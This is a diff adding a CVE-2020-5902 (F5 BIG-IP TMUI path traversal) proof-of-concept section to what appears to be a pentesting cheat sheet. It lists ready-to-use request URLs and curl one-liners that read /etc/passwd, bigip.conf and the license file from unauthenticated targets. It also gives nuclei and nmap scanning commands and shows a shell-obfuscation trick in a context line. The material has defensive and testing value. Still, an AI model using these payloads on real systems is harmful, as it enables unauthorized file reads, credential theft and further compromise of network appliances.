@@ -151,3 +151,57 @@ cat ${test//hh??hm/}
     - [JSParser](https://github.com/nahamsec/JSParser)
 
 ***
+
+## BIGIP CVE-2020-5902 PoC
+*CVE-2020-5902 allows for unauthenticated attackers  execute arbitrary system commands, create or delete files, disable services, and/or execute arbitrary Java code.  [[+]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5902)*
+
+```powershell
+https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
+```
+
+```console
+https://{host}/tmui/login.jsp/..;/tmui/system/user/authproperties.jsp
+```
+
+```ruby
+https://{host}/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId=jaffa
+```
+
+```bash
+https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
+```
+
+```python
+https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
+```
+
+* **Manuel POC**:
+```ruby
+curl -sk 'https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
+```
+
+```bash
+curl -sk 'https://{IP}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
+```
+
+* **Nuclei Detect CVE-2020-5902**
+https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/CVE-2020-5902.yaml
+
+```console
+nuclei -t ~/tool/nuclei/nuclei-templates/cves/CVE-2020-5902.yaml -l https.txt
+```
+![image](https://i.ibb.co/hHsWjrk/4.png)
+
+![image](https://i.ibb.co/fNm0JGL/2.png)
+
+* **NMAP Script for CVE-2020-5902**
+
+```powershell
+wget https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-5902.nse
+```
+
+```console
+nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
+```
+
+![image](https://i.ibb.co/S0df0bk/5.png)
